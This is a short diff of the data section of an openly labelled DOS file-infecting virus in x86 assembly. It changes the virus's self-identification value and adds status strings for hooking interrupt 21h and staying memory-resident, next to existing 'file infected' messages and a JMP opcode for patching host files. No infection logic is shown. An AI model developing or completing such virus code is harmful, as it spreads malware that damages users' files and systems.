@@ -2,7 +2,7 @@
 ; Data Area
 ;----------------------------------------------------------------------------
 nISRNumber EQU 21h
-nVirusID EQU 4BF7h ;has to be 4Bxxh where the range are xx=03 to FF
+nVirusID EQU 4B12h ;has to be 4Bxxh where the range are xx=03 to FF
 _DX_DS dw 2 dup (?) ;DS:DX is stored here, first DX, then DS
 ;------------------------- DON'T SEPERATE -------------------------
 HostBytesNew db 0E9h ;opcode for a JMP instruction
@@ -26,5 +26,7 @@ sFileInfected db "File has been infected...",0
 sClosingFile db "Closing File...",0
 sJumpUpdated db "Jump Instruction Added...", 0
 sAlreadyInfected db "File is already infected...",0
+hookdone db "The ISR is hook the virus are TSR",0
+newisr db "Install New ISR..",0
 db "File Handle:"
 wHostFileHandle dw ? ;handle of the host file
